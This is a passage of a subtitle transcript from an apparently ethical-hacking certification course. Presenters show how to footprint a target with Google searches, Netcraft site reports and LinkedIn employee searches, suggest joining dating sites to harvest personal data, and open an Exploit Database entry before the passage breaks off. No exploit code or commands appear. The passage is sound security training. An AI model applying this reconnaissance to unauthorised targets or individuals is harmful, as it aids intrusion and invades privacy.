of security\nlet's actually go ahead and\n\n132\n00:05:33.570 --> 00:05:38.480\nlet's search for hacking tools.\n\n133\n00:05:38.480 --> 00:05:40.610\nOkay we'll do something that\nwe can actually use and\n\n134\n00:05:40.610 --> 00:05:42.870\nmaybe just show the people\nout there some links to.\n\n135\n00:05:42.870 --> 00:05:46.350\nAnd so we can search for hacking tools but\nwe could do that on Google's main page,\n\n136\n00:05:46.350 --> 00:05:48.310\nit's not really narrowing the search, but\n\n137\n00:05:48.310 --> 00:05:51.500\nthen what we can do is we can\nadd some additional information.\n\n138\n00:05:51.500 --> 00:05:54.140\nWe can add a subterm that\nwould allow us to search for\n\n139\n00:05:54.140 --> 00:05:57.660\nhacking tools specific to Linux or\nMicrosoft, and again,\n\n140\n00:05:57.660 --> 00:06:01.580\nwe could do this from the main page by\nputting the search terms in quotes,\n\n141\n00:06:01.580 --> 00:06:05.040\nadding an operator, an AND or\nan OR to the search string.\n\n142\n00:06:05.040 --> 00:06:09.050\nSo we can do advanced searches\ndirectly from the main Google page but\n\n143\n00:06:09.050 --> 00:06:13.070\nwe have to know the syntax, understand\nhow to manipulate the search engine,\n\n144\n00:06:13.070 --> 00:06:17.810\nand not everybody's taken the hey how\ndo I use Google to search course.\n\n145\n00:06:17.810 --> 00:06:20.620\nAnd if you're not doing that or\nhaven't done that before\n\n146\n00:06:20.620 --> 00:06:24.250\nyou may not realize you could do advanced\ntext string or contextual searches.\n\n147\n00:06:24.250 --> 00:06:27.753\nThey have some examples there as\nI think you're zooming in on so\n\n148\n00:06:27.753 --> 00:06:29.085\nyou can see the syntax.\n\n149\n00:06:29.085 --> 00:06:32.207\nSo it would be helpful for\nyou to start learning how to use\n\n150\n00:06:32.207 --> 00:06:35.730\nGoogle essentially to create not\njust a searchable feature but\n\n151\n00:06:35.730 --> 00:06:39.760\nreally a data mining feature which\nis the next level of searching.\n\n152\n00:06:39.760 --> 00:06:43.610\nYou want to go in and be very prescriptive\nand link together different search terms\n\n153\n00:06:43.610 --> 00:06:46.070\nand concepts and\nbe able to come back out the far end.\n\n154\n00:06:46.070 --> 00:06:47.830\nSo let's search for hacking tools.\n\n155\n00:06:47.830 --> 00:06:55.124\nLet's search for Microsoft and maybe\nlet's search for Windows server 2012 rt.\n\n156\n00:06:55.124 --> 00:06:59.576\nLet's try to narrow that focus specific\nmaybe to some tools for server 12 rt.\n\n157\n00:06:59.576 --> 00:07:04.066\nI'm sure if we searched for XP we'd find\na million things but we can then look for\n\n158\n00:07:04.066 --> 00:07:06.180\nand find whatever may come up.\n\n159\n00:07:06.180 --> 00:07:09.060\nI'm not really interested per\nse in what those options are.\n\n160\n00:07:09.060 --> 00:07:10.430\nYou guys can do this on your own.\n\n161\n00:07:10.430 --> 00:07:13.150\nThis is not really as going out and\nfinding tools for you but\n\n162\n00:07:13.150 --> 00:07:16.670\nrather just showing you the way in\nwhich we may be able to footprint\n\n163\n00:07:16.670 --> 00:07:18.670\nusing the Google search engine.\n\n164\n00:07:18.670 --> 00:07:21.880\nWe're able to grab tools right and\nthen use those tools,\n\n165\n00:07:21.880 --> 00:07:24.620\nnow this is not traditionally foot\nprinting, this is just searching.\n\n166\n00:07:24.620 --> 00:07:25.220\n>> Yeah.\n>> Right.\n\n167\n00:07:25.220 --> 00:07:26.949\n>> And I think I actually put that in\n\n168\n00:07:26.949 --> 00:07:30.995\nthe wrong box you see they came up as ors,\nbecause I said any of these words.\n\n169\n00:07:30.995 --> 00:07:31.652\n>> Okay.\n\n170\n00:07:31.652 --> 00:07:32.634\n>> So let's move that.\n\n171\n00:07:32.634 --> 00:07:33.880\n>> So you're going to move that up?\n\n172\n00:07:33.880 --> 00:07:35.690\nAnd then to\n\n173\n00:07:35.690 --> 00:07:39.020\nsee what kind of different results\nwe get off of some quotes on here.\n\n174\n00:07:39.020 --> 00:07:39.780\n>> All right.\n\n175\n00:07:39.780 --> 00:07:41.380\nSo we'll let Mike just set that up for\na second.\n\n176\n00:07:41.380 --> 00:07:44.150\nWhat I was just going to point\nout is this is not footprinting\n\n177\n00:07:44.150 --> 00:07:45.210\nthrough search engines but\n\n178\n00:07:45.210 --> 00:07:49.150\nrather using search engines to find tools\nthat could then be used for footprinting.\n\n179\n00:07:49.150 --> 00:07:51.722\nWe're going to show you\nhow to search through, or\n\n180\n00:07:51.722 --> 00:07:54.368\nuse Google to footprint in just a minute,\nas well.\n\n181\n00:07:54.368 --> 00:07:57.780\nSo, you probably get things that\nmay be similar, may be different.\n\n182\n00:07:57.780 --> 00:07:59.655\nI'm sure there's a variety\nof things that are listed.\n\n183\n00:07:59.655 --> 00:08:01.288\n>> Yup.\n>> Some of them may be links to tools.\n\n184\n00:08:01.288 --> 00:08:03.919\nOther may be links to Your websites or\narticles,\n\n185\n00:08:03.919 --> 00:08:06.496\nthere's a variety of\nthings that'll come up.\n\n186\n00:08:06.496 --> 00:08:08.400\nWhitepapers, who knows what.\n\n187\n00:08:08.400 --> 00:08:11.772\nBut let’s go up to Google, just the main\nsearch bar right there, that'll be fine.\n\n188\n00:08:11.772 --> 00:08:12.801\nJust yeah, where you were.\n\n189\n00:08:12.801 --> 00:08:16.322\nAnd lets go ahead and let us go and let's,\n\n190\n00:08:16.322 --> 00:08:20.447\ninstead of using Google directly,\nlet's go and\n\n191\n00:08:20.447 --> 00:08:25.888\nlet's go to the Netcraft search\nengine that you and I loaded up.\n\n192\n00:08:25.888 --> 00:08:28.108\nAnd we're gonna show you\nhow to use the web and\n\n193\n00:08:28.108 --> 00:08:30.725\na search engine to footprint specifically.\n\n194\n00:08:30.725 --> 00:08:33.897\nSo with Netcraft, what we can do\nis we can use, and by the way,\n\n195\n00:08:33.897 --> 00:08:37.619\nNetcraft can be downloaded as a toolbar\nthat you can load into a browser.\n\n196\n00:08:37.619 --> 00:08:41.553\nSo you could do this from the toolbar or\nyou can just go to the Netcraft website\n\n197\n00:08:41.553 --> 00:08:45.116\nand use the site report feature which\nis one of the links on the left and\n\n198\n00:08:45.116 --> 00:08:46.830\nthen profile a site.\n\n199\n00:08:46.830 --> 00:08:50.571\nSo it brings up the Netcraft site\nby default or profiles that one.\n\n200\n00:08:50.571 --> 00:08:54.828\nLet's go out and let's type in a website,\n\n201\n00:08:54.828 --> 00:08:58.400\nlet's do newhorizons.com.\n\n202\n00:08:58.400 --> 00:09:00.180\nAnd when we do this,\nwe'll give it a second.\n\n203\n00:09:00.180 --> 00:09:00.840\nIt goes out.\n\n204\n00:09:00.840 --> 00:09:03.660\nYou just hit the Enter,\nit'll be spinning, it'll search.\n\n205\n00:09:03.660 --> 00:09:07.480\nWhen it comes back, once it resolves,\nthen what we'll find looks like,\n\n206\n00:09:07.480 --> 00:09:08.530\nit just loaded right.\n\n207\n00:09:08.530 --> 00:09:10.905\nWe'll find, you may have to, yeah,\nI was gonna say, zoom in a little bit so\n\n208\n00:09:10.905 --> 00:09:13.670\nI can narrate because I'm not able to\nsee everything from where I'm standing.\n\n209\n00:09:13.670 --> 00:09:15.085\nWe have the New Horizons website.\n\n210\n00:09:15.085 --> 00:09:17.200\nTells us when it was first set up.\n\n211\n00:09:17.200 --> 00:09:18.440\nI can see it from there, it's fine.\n\n212\n00:09:18.440 --> 00:09:22.070\nTells us what the primary language is,\nthat's useful information.\n\n213\n00:09:22.070 --> 00:09:25.730\nNetwork, scroll down, gives us the name\nregistration information we had taken\n\n214\n00:09:25.730 --> 00:09:29.350\na look at with Nslookup and\nthe other tools we used.\n\n215\n00:09:29.350 --> 00:09:31.230\nGives us the DNS name servers,\n\n216\n00:09:31.230 --> 00:09:34.170\ntells us where it's registered,\nwho the hosting company is.\n\n217\n00:09:34.170 --> 00:09:35.490\nGood information to know.\n\n218\n00:09:35.490 --> 00:09:37.000\nWhat country it's hosted in.\n\n219\n00:09:37.000 --> 00:09:38.920\nAs you continue down we've\ngot hosting history.\n\n220\n00:09:38.920 --> 00:09:40.740\nGives us a sense of where it is.\n\n221\n00:09:40.740 --> 00:09:42.080\nScroll over to the right.\n\n222\n00:09:42.080 --> 00:09:45.950\nRight there under web server you will see\nthe operating system of the web server\n\n223\n00:09:45.950 --> 00:09:46.790\non the type.\n\n224\n00:09:46.790 --> 00:09:51.030\nSo it tells us a very important piece\nof information about the hosting.\n\n225\n00:09:51.030 --> 00:09:54.800\nTells us what operating system and version\nof what web service we're up against.\n\n226\n00:09:54.800 --> 00:09:58.390\nNow we can see that another way if scroll\nover the left and keep going down.\n\n227\n00:09:58.390 --> 00:10:01.740\nLets assume for many who missed that,\nyou didn't see that was there.\n\n228\n00:10:01.740 --> 00:10:06.093\nWe have a security area where it profiles\nthe potential weaknesses on the site, and\n\n229\n00:10:06.093 --> 00:10:08.035\ntells us what that profile may mean.\n\n230\n00:10:08.035 --> 00:10:09.976\nIf you see a number approaching ten,\n\n231\n00:10:09.976 --> 00:10:14.370\nthat means the site is at more risk of\nbeing compromised, there's various risks.\n\n232\n00:10:14.370 --> 00:10:18.500\nHeartbleed, SSL risks, various things\nthey profile that they look at.\n\n233\n00:10:18.500 --> 00:10:22.275\nYou can read up on the FAQ link\nunderneath Network Risk Rating.\n\n234\n00:10:22.275 --> 00:10:25.935\nThat will tell you what all the different\nrankings are and show you more or\n\n235\n00:10:25.935 --> 00:10:27.970\nless what that information may mean.\n\n236\n00:10:27.970 --> 00:10:31.800\nYou can go through and see what that is,\nso you can get a sense of the site and\n\n237\n00:10:31.800 --> 00:10:32.650\nlearn more about it.\n\n238\n00:10:33.870 --> 00:10:38.010\nWe then can go down, we see whether they\nhave an SPF, a sender policy framework,\n\n239\n00:10:38.010 --> 00:10:42.410\nand a DMARC registration records so\nwe understand information about how this\n\n240\n00:10:42.410 --> 00:10:46.340\nsite protects you, and potentially\noffers protection to those that use it.\n\n241\n00:10:46.340 --> 00:10:50.220\nWe see what web tracking software and\nwidgets are installed on the site.\n\n242\n00:10:50.220 --> 00:10:53.480\nSo we know ahead of time how they\nare tracking what kind of analytics they\n\n243\n00:10:53.480 --> 00:10:56.720\nare using which can also be helpful\nfrom a hacking perspective.\n\n244\n00:10:56.720 --> 00:10:59.680\nWe keep going down and\nthen under Site Technology\n\n245\n00:10:59.680 --> 00:11:03.230\nwe're going to see what extensions and\nserver side add-ons are running.\n\n246\n00:11:03.230 --> 00:11:05.140\nThe way I can tell this is Microsoft,\n\n247\n00:11:05.140 --> 00:11:06.945\nI don't even need to look\nat that column up there.\n\n248\n00:11:06.945 --> 00:11:09.760\nThat second item where it\nsays Using ASP.NET is going\n\n249\n00:11:09.760 --> 00:11:12.190\nto tell me that they\nare running Microsoft code.\n\n250\n00:11:12.190 --> 00:11:15.270\nWhich means they must be running\nan IS website of some kind.\n\n251\n00:11:15.270 --> 00:11:18.770\nNow, I don't know the version based on\nthat, but I get the version up above.\n\n252\n00:11:18.770 --> 00:11:21.720\nAnd so I can tell all that is there.\n\n253\n00:11:21.720 --> 00:11:25.680\nSo this tells me and\ngives me information that can be helpful.\n\n254\n00:11:25.680 --> 00:11:28.875\nAs I continue to scroll down, we see\nwhat the client-side extensions are.\n\n255\n00:11:28.875 --> 00:11:31.260\nWe see the scripting\nframeworks that are supported.\n\n256\n00:11:31.260 --> 00:11:35.380\njQuery is there so\nI know there's the use of java querying.\n\n257\n00:11:36.550 --> 00:11:39.370\nWe also, as we go down,\nsee ASP.NET Application so\n\n258\n00:11:39.370 --> 00:11:40.920\nI know they're using DotNetNuke.\n\n259\n00:11:40.920 --> 00:11:43.382\nSo they're maybe exploits\nagainst that particular one,\n\n260\n00:11:43.382 --> 00:11:46.107\nwe're gonna take a look and\nsee what we can find here in a minute.\n\n261\n00:11:46.107 --> 00:11:50.872\nAnd under Mobile Technologies we\nsee that we have Click to call, and\n\n262\n00:11:50.872 --> 00:11:56.056\nthere are additional items for\ncharacter encoding, http compression,\n\n263\n00:11:56.056 --> 00:12:01.590\nand the web browser tracking, as well as\nall the different stuff that goes on.\n\n264\n00:12:01.590 --> 00:12:03.510\nWe can see the HTML version that's there.\n\n265\n00:12:03.510 --> 00:12:05.420\nWe see we're using version five.\n\n266\n00:12:05.420 --> 00:12:09.090\nSo we can get a great deal of\ninformation by using Netcraft\n\n267\n00:12:09.090 --> 00:12:12.170\nto do finger printing and\nusing the search engine to provide that.\n\n268\n00:12:12.170 --> 00:12:16.180\nThis is an incredibly valuable tool\nbecause this can help us immediately if\n\n269\n00:12:16.180 --> 00:12:20.160\nwe're looking to do fingerprinting on\nweb related surfaces to zoom in right?\n\n270\n00:12:20.160 --> 00:12:22.250\nAnd to see what's there, and to get.\n\n271\n00:12:22.250 --> 00:12:24.880\n>> It seems to bring a couple\nof the other things in.\n\n272\n00:12:26.035 --> 00:12:29.840\nWith a one stop solution where\nwe didn't have to do NSlookup,\n\n273\n00:12:29.840 --> 00:12:31.720\nwe got some of that information from here.\n\n274\n00:12:31.720 --> 00:12:34.990\nWe didn't have to do a WHOIS lookup\nit’s all being pulled right out of here.\n\n275\n00:12:34.990 --> 00:12:39.020\n>> Almost all, yet there may still be\na need to go in and cross reference.\n\n276\n00:12:40.370 --> 00:12:42.361\nThis is information you\ncan definitely trust.\n\n277\n00:12:42.361 --> 00:12:44.421\nIn other words,\nit’s not gonna come back and\n\n278\n00:12:44.421 --> 00:12:46.830\ngive you random stuff\nthat’s not believable.\n\n279\n00:12:46.830 --> 00:12:48.890\nSo I'm not suggesting when I\nsay when you cross reference,\n\n280\n00:12:48.890 --> 00:12:51.230\nthat you can just use this\none tool to your point.\n\n281\n00:12:51.230 --> 00:12:56.404\nBut what I just wanna point out to you is,\nwhen you're doing pen tests, you're doing\n\n282\n00:12:56.404 --> 00:13:00.080\nloadability assessments, you're an ethical\nhacker working for a company, you wanna\n\n283\n00:13:00.080 --> 00:13:03.730\nvalidate the information you get from\nany single tool by cross referencing it.\n\n284\n00:13:03.730 --> 00:13:05.750\nTo make sure that you're\nnot missing something.\n\n285\n00:13:05.750 --> 00:13:08.830\nMeaning, did we get all the name\nregistration servers in here?\n\n286\n00:13:08.830 --> 00:13:11.400\n>> Did we get the right\nname registration system?\n\n287\n00:13:11.400 --> 00:13:15.080\nUsually this is right with no trouble but\nI always like to go out and\n\n288\n00:13:15.080 --> 00:13:18.560\nuse NSlookup, or I always like to go\nout and reference WOIS or Iona or\n\n289\n00:13:18.560 --> 00:13:22.620\nARIN or whatever the database may be that\nI'll use as you know kind of a benchmark,\n\n290\n00:13:22.620 --> 00:13:24.930\nto say well,\nI know this is the official record.\n\n291\n00:13:24.930 --> 00:13:26.240\nHow well does the tool stack up?\n\n292\n00:13:26.240 --> 00:13:27.620\nAm I getting everything?\n\n293\n00:13:27.620 --> 00:13:29.340\nJust because I wanna show the client,\n\n294\n00:13:29.340 --> 00:13:32.240\nI wanna show the customer that\nwe did our due diligence.\n\n295\n00:13:32.240 --> 00:13:33.860\nWe talked about the need for that.\n\n296\n00:13:33.860 --> 00:13:36.300\nWe've covered all the basis,\nso to speak, right?\n\n297\n00:13:36.300 --> 00:13:38.270\nSo, we're not leaving any still unturned.\n\n298\n00:13:38.270 --> 00:13:41.100\nThe reason for this, aside from\nthe obvious, right, we have that full\n\n299\n00:13:41.100 --> 00:13:45.250\ndisclosure, clients paying us,\nwe have to get or earn our money.\n\n300\n00:13:45.250 --> 00:13:48.480\nOther than that,\nthe other big reason to do this is,\n\n301\n00:13:48.480 --> 00:13:52.180\nI promise you that the unethical\nhackers that are looking for\n\n302\n00:13:52.180 --> 00:13:54.680\nadvantage are gonna go out and\ncross reference information.\n\n303\n00:13:54.680 --> 00:13:56.360\nAt least the ones that aren't lazy, right?\n\n304\n00:13:56.360 --> 00:13:58.550\nThat are just sitting around and\nhave other stuff they're doing.\n\n305\n00:13:58.550 --> 00:14:02.310\nBut anyone who's really dedicated to\ngetting in is gonna use more than one tool\n\n306\n00:14:02.310 --> 00:14:04.790\nbecause they're gonna do the same\nexact thing I just describe.\n\n307\n00:14:04.790 --> 00:14:08.040\nBecause they're gonna look for\nthat additional information that may not\n\n308\n00:14:08.040 --> 00:14:11.233\nshow up in the symbol tool because\nthey may then able to use that.\n\n309\n00:14:11.233 --> 00:14:13.269\nA lot of the times that we're\nnot gonna find anything else,\n\n310\n00:14:13.269 --> 00:14:14.459\nwe're gonna find the same thing.\n\n311\n00:14:14.459 --> 00:14:17.521\nBut there sometimes is, and\nI've seen it happen with Netcraft and\n\n312\n00:14:17.521 --> 00:14:20.034\nothers, where we don't still\nget a full listing, and\n\n313\n00:14:20.034 --> 00:14:22.240\nas a result we may not\nsee the complete picture.\n\n314\n00:14:22.240 --> 00:14:25.250\nSo it's always good to cross\nreference with more than one tool.\n\n315\n00:14:25.250 --> 00:14:30.340\nWHOIS, NSlookup, we did some demos on\nthat, in the prior episode with labs.\n\n316\n00:14:30.340 --> 00:14:32.640\nThere's a lot of different ways\nto get to this information.\n\n317\n00:14:32.640 --> 00:14:35.840\nSo this can help us to do some\nfootprinting through search engines.\n\n318\n00:14:35.840 --> 00:14:40.180\nThen again I mentioned yesterday in the\nprior episodes that we had gone through\n\n319\n00:14:40.180 --> 00:14:41.950\nwith regards to Googling yourself,\n\n320\n00:14:41.950 --> 00:14:44.870\nwe joked around about that, right,\nand seeing what's out there.\n\n321\n00:14:44.870 --> 00:14:48.980\nGoing to LinkedIn and doing a search for\npeople that may work in the company.\n\n322\n00:14:48.980 --> 00:14:51.860\nSo for instance, can we just bring up\nLinkedIn, or should I say Microsoft, but\n\n323\n00:14:51.860 --> 00:14:53.600\nwe can say LinkedIn for a moment.\n\n324\n00:14:53.600 --> 00:14:57.070\nBut if you can bring up the link just\na normal LinkedIn website, nothing fancy.\n\n325\n00:14:57.070 --> 00:14:59.690\nWe'll go back to Mike's machine as\nsoon as he tells us he's ready.\n\n326\n00:14:59.690 --> 00:15:02.730\nWhat I'm just gonna quickly show you\nis what you could find from LinkedIn\n\n327\n00:15:02.730 --> 00:15:04.930\njust randomly searching somebody, right.\n\n328\n00:15:04.930 --> 00:15:07.210\nNow, do you have an account on LinkedIn?\n\n329\n00:15:07.210 --> 00:15:07.740\n>> I do [INAUDIBLE].\n\n330\n00:15:07.740 --> 00:15:08.800\n>> Okay, can you just log in real quick?\n\n331\n00:15:08.800 --> 00:15:11.950\nThat way we don't have to go through the\nwhole ridiculousness of hey, who are you?\n\n332\n00:15:11.950 --> 00:15:13.370\nWe only let you see two people.\n\n333\n00:15:13.370 --> 00:15:14.470\nSo Mike's going to log in,\n\n334\n00:15:14.470 --> 00:15:17.300\nif you wanna log in as soon as\nMike's ready we can take a look.\n\n335\n00:15:17.300 --> 00:15:19.962\nBut what Mike's going to do\nis just bring up his account.\n\n336\n00:15:19.962 --> 00:15:22.755\nAnd we don't really want to see\nwhat Mike has in there, but\n\n337\n00:15:22.755 --> 00:15:24.984\nwe want to use the account\nsimply as a gateway.\n\n338\n00:15:24.984 --> 00:15:28.788\nA key to open up the search feature,\nbecause as an authorized user,\n\n339\n00:15:28.788 --> 00:15:30.405\nyou can search on LinkedIn.\n\n340\n00:15:30.405 --> 00:15:32.105\nSo up at the top there,\n\n341\n00:15:32.105 --> 00:15:36.535\nright above Mike's profile, in the middle\nthere, we've got the search for.\n\n342\n00:15:36.535 --> 00:15:43.540\nSo let's go out and let's search for\nnewhorizons.com, lets just search.\n\n343\n00:15:43.540 --> 00:15:45.440\nWell better yet,\nlets search for EC-Council.\n\n344\n00:15:45.440 --> 00:15:47.303\nWe are doing a CEH course after all.\n\n345\n00:15:47.303 --> 00:15:50.677\nSearch for EC-Council, lets see what we\nget, and just without even clicking on\n\n346\n00:15:50.677 --> 00:15:53.860\nanything, we're not interested\nin putting anybody's profile up.\n\n347\n00:15:53.860 --> 00:15:57.008\nWhat you'll find is,\nyou'll find probably Either a group or\n\n348\n00:15:57.008 --> 00:15:58.712\ninformation about the company.\n\n349\n00:15:58.712 --> 00:16:01.880\nThere's probably, I'm sure they\nhave a group that you could follow.\n\n350\n00:16:01.880 --> 00:16:06.410\nAnd then you probably have some of\nthe different things that are listed.\n\n351\n00:16:06.410 --> 00:16:09.210\nThere's what, one there for\nsurveillance team, it looks like,\n\n352\n00:16:09.210 --> 00:16:13.290\nglobal services, CAST for EC-Council.\n\n353\n00:16:13.290 --> 00:16:15.986\nThere's probably individuals that work for\n\n354\n00:16:15.986 --> 00:16:18.205\nEC-Council that have\nEC-Council on their profile.\n\n355\n00:16:18.205 --> 00:16:22.680\nIf we went to advanced, to the right of\nthe search, on top, and you go there,\n\n356\n00:16:22.680 --> 00:16:26.970\nyou may be able to use the advanced search\nfeatures to be able to do a search.\n\n357\n00:16:28.730 --> 00:16:32.490\nMuch like we did on Google, and\nyou can go in and use keyword searches and\n\n358\n00:16:32.490 --> 00:16:36.970\ncombine things, there you go.\n\n359\n00:16:36.970 --> 00:16:40.320\nIf we look for individuals that\nhave certain attributes or\n\n360\n00:16:40.320 --> 00:16:43.270\nitems associated with them,\nwe can narrow the search,\n\n361\n00:16:43.270 --> 00:16:47.540\nwe may be able to find people specifically\nthat have EC-Council in their profile.\n\n362\n00:16:47.540 --> 00:16:49.790\nWe'd be able to see who works for\nEC-Council.\n\n363\n00:16:49.790 --> 00:16:52.170\nWe may be able to find people\nthat are CEH certified,\n\n364\n00:16:52.170 --> 00:16:55.555\nwe could put CH in as a certification or\na keyword match.\n\n365\n00:16:55.555 --> 00:16:56.090\n>> Mm-hm.\n>> But\n\n366\n00:16:56.090 --> 00:16:58.370\nimagine we're doing this\nto do ethical hacking.\n\n367\n00:16:58.370 --> 00:16:59.360\nWe're trying to hack company Y.\n\n368\n00:16:59.360 --> 00:17:02.230\nWe would put company Y's name in there,\n\n369\n00:17:02.230 --> 00:17:07.610\nwe'd put in products that company Y sells,\ncertifications that company Y may offer.\n\n370\n00:17:07.610 --> 00:17:13.190\nThere's a million ways to peel\nthose layers of knowledge back and\n\n371\n00:17:13.190 --> 00:17:17.940\nopen up that information, exposing all the\ninformation in the LinkedIn database and\n\n372\n00:17:17.940 --> 00:17:20.940\nthen grabbing those users and\ntrying to find them and\n\n373\n00:17:20.940 --> 00:17:22.750\nsee what they may be able to tell us.\n\n374\n00:17:22.750 --> 00:17:25.902\nAs we talked about, there's probably\na lot of information in here.\n\n375\n00:17:25.902 --> 00:17:27.810\nNow LinkedIn's not the only\nplace we would do this.\n\n376\n00:17:27.810 --> 00:17:32.420\nWe could go to Facebook,\nyou could go to Twitter.\n\n377\n00:17:32.420 --> 00:17:36.730\nYou can go to, somebody mentioned in\nthe chat in one of our prior episodes,\n\n378\n00:17:36.730 --> 00:17:39.950\ndating sites that offer\na great deal of information.\n\n379\n00:17:39.950 --> 00:17:42.530\nYou may have to create an account and\nbecome a member there but\n\n380\n00:17:42.530 --> 00:17:43.170\nhow hard is that?\n\n381\n00:17:43.170 --> 00:17:47.060\nIt doesn't cost anything traditionally\nto do that and you could go in and\n\n382\n00:17:47.060 --> 00:17:49.660\nyou could then leverage those databases.\n\n383\n00:17:49.660 --> 00:17:54.105\nThe main reason that a company like\nMicrosoft buys a company like LinkedIn,\n\n384\n00:17:54.105 --> 00:17:58.020\naside from all the hype about the\nacquisition, things like that, when you\n\n385\n00:17:58.020 --> 00:18:03.350\nstrip it down, you don't spend $26 billion\nto buy a company because you don't\n\n386\n00:18:03.350 --> 00:18:07.250\nsee a lot of value especially when the\ncompany's not worth anywhere near that.\n\n387\n00:18:07.250 --> 00:18:10.470\nWhat they bought it for,\nfirst and foremost, bottom line,\n\n388\n00:18:10.470 --> 00:18:15.260\njust being brutally honest Is the data\nthat LinkedIn has on 400 million members.\n\n389\n00:18:15.260 --> 00:18:20.090\nThat Microsoft wants to access and\nuse to sell and market to ultimately and\n\n390\n00:18:20.090 --> 00:18:23.865\nget people into the cloud, get them\nto consume more cloud services and\n\n391\n00:18:23.865 --> 00:18:26.170\nto be brutally honest, make more money.\n\n392\n00:18:26.170 --> 00:18:29.630\nThey went out and\ninvested 26 billion because they assume\n\n393\n00:18:29.630 --> 00:18:33.610\nthat they're gonna make ten times that,\nif not more, selling services and\n\n394\n00:18:33.610 --> 00:18:37.510\naggregating information about these\nusers now that they own all that data.\n\n395\n00:18:37.510 --> 00:18:41.920\nThose of you that have profiles on\nLinkedIn, that's the reality of the world.\n\n396\n00:18:41.920 --> 00:18:44.880\nThat's what they're doing,\nthey're buying rights to that.\n\n397\n00:18:44.880 --> 00:18:47.700\nIf you remember Radio Shack as a company,\nthose of you that may\n\n398\n00:18:47.700 --> 00:18:51.300\nhave been around long enough and\nbe adults at a certain point in time,\n\n399\n00:18:51.300 --> 00:18:55.300\nwhere Radio Shack was a huge company\nin this country for many, many years.\n\n400\n00:18:55.300 --> 00:18:58.670\nA shell of its former self, basically\ngone, there's really nothing left.\n\n401\n00:18:58.670 --> 00:19:00.240\nBut, when they were bought,\n\n402\n00:19:00.240 --> 00:19:05.050\nbefore they went into bankruptcy,\nthe original cycle of buying really was\n\n403\n00:19:05.050 --> 00:19:08.820\naround the customer database that they had\nbecause that was what was worth money.\n\n404\n00:19:08.820 --> 00:19:12.500\nNot the products they had in their stores,\nnot the gadgets and\n\n405\n00:19:12.500 --> 00:19:16.640\nall that kind of stuff and\nthe batteries and the wires you would buy.\n\n406\n00:19:16.640 --> 00:19:19.250\nThat's physical inventory that's\nworth a certain amount of money.\n\n407\n00:19:19.250 --> 00:19:22.642\nIt wasn't worth the money that the people\nthat bought the company spent for it,\n\n408\n00:19:22.642 --> 00:19:24.009\nit was the customer database and\n\n409\n00:19:24.009 --> 00:19:26.350\nwhat they could do with that\ndata that was worth money.\n\n410\n00:19:26.350 --> 00:19:29.570\nAnd that's really what we talk about\nwhen we think about footprinting and\n\n411\n00:19:29.570 --> 00:19:35.250\nsearching through things like social media\nto be able to go in and find information.\n\n412\n00:19:35.250 --> 00:19:36.770\nThis is another thing we can do.\n\n413\n00:19:36.770 --> 00:19:40.510\nLet's take a look at how to\nreference this information but\n\n414\n00:19:40.510 --> 00:19:41.940\nlook at it from a different perspective.\n\n415\n00:19:41.940 --> 00:19:45.088\nCan we go to the Google hacking\nsite that we have up as well?\n\n416\n00:19:45.088 --> 00:19:46.160\n>> We can.\n>> We're going to go\n\n417\n00:19:46.160 --> 00:19:47.510\nback to Mike's machine.\n\n418\n00:19:47.510 --> 00:19:50.920\nAll we did was do a Google search for\na Google hacking database,\n\n419\n00:19:50.920 --> 00:19:52.770\nyou can certainly do that on your own.\n\n420\n00:19:52.770 --> 00:19:55.390\nYou'll find a bunch of links,\nif you play with them, eventually,\n\n421\n00:19:55.390 --> 00:19:57.100\nyou'll get to the right one.\n\n422\n00:19:57.100 --> 00:20:01.020\nMike will post the link for you, as we\nalways do for all of the sites we go to.\n\n423\n00:20:01.020 --> 00:20:05.570\nThe Google hacking database is\nan online database of search strings,\n\n424\n00:20:05.570 --> 00:20:10.280\nadvanced query strings for\nGoogle that could be essentially fed into\n\n425\n00:20:10.280 --> 00:20:14.170\nthe Google search engine that will\nthen yield some interesting results.\n\n426\n00:20:14.170 --> 00:20:18.110\nWhat you will find up there,\nthis is just the overview information,\n\n427\n00:20:18.110 --> 00:20:21.610\nkinda who are we,\nwhere do we come from, why are we here?\n\n428\n00:20:21.610 --> 00:20:26.840\nBut what we wanna do is go in and we want\nto be able to go and we wanna take a look.\n\n429\n00:20:26.840 --> 00:20:28.580\nLet me just pull up,\n\n430\n00:20:28.580 --> 00:20:31.910\ncuz I'm having trouble seeing what you\nhave up there cuz it's so far away.\n\n431\n00:20:31.910 --> 00:20:33.850\nGive me just half a second so\nI could see it.\n\n432\n00:20:33.850 --> 00:20:36.870\nYou should have,\ndo we have exploits up there?\n\n433\n00:20:36.870 --> 00:20:38.670\nUp on the top menu?\n>> Let's see, I do not.\n\n434\n00:20:42.490 --> 00:20:43.590\nExplore, there we go.\n\n435\n00:20:43.590 --> 00:20:45.720\nProjects, exploit database.\n\n436\n00:20:45.720 --> 00:20:48.600\n>> Yeah, exactly, so\nthey just aren't able to see the link so\n\n437\n00:20:48.600 --> 00:20:50.030\nI can't see where you are.\n\n438\n00:20:50.030 --> 00:20:54.030\nUnder the exploit database, we're able to\ngo in, just scroll down a little bit, and\n\n439\n00:20:54.030 --> 00:20:56.380\nwe're able to go and\nsearch the exploit database.\n\n440\n00:20:56.380 --> 00:20:59.670\nOff to the right, you'll see it\nsays search this database and\n\n441\n00:20:59.670 --> 00:21:04.200\nwhat this is is this is going to\nallow us to be able to go in and\n\n442\n00:21:04.200 --> 00:21:06.940\nessentially have a listing\nof all the current exploits.\n\n443\n00:21:06.940 --> 00:21:09.610\nYou can see it broken up by\ncategory that people have posted.\n\n444\n00:21:09.610 --> 00:21:12.360\nAnd there's a whole bunch in there,\nlocal and privileged,\n\n445\n00:21:12.360 --> 00:21:16.940\ndenial of service, shellcode,\nall sorts of stuff.\n\n446\n00:21:16.940 --> 00:21:22.400\nAnd if you go back up towards the top,\nwhat we'll find is remote exploits.\n\n447\n00:21:22.400 --> 00:21:25.370\nSo, just tell me one of the ones on there\nthat you think may look interesting.\n\n448\n00:21:25.370 --> 00:21:27.660\nTake a quick look, let's pick something.\n\n449\n00:21:27.660 --> 00:21:28.740\n>> Let's see here.\n\n450\n00:21:28.740 --> 00:21:30.860\nPoison Ivy buffer overflow, Windows.\n\n451\n00:21:30.860 --> 00:21:35.760\n>> Okay, go ahead and click on that one\nNow what that's gonna do is show us\n\n452\n00:21:35.760 --> 00:21:40.270\nthe exploit code that somebody\nwould copy and use essentially.\n\n453\n00:21:40.270 --> 00:21:42.160\nWhatever the code is,\nthere's a whole bunch of code there,\n\n454\n00:21:42.160 --> 00:21:46.310\nit's all broken out and we would then\nbe able to use that if we wanted to,\n\n455\n00:21:46.310 --> 00:21:49.970\nto essentially turn around 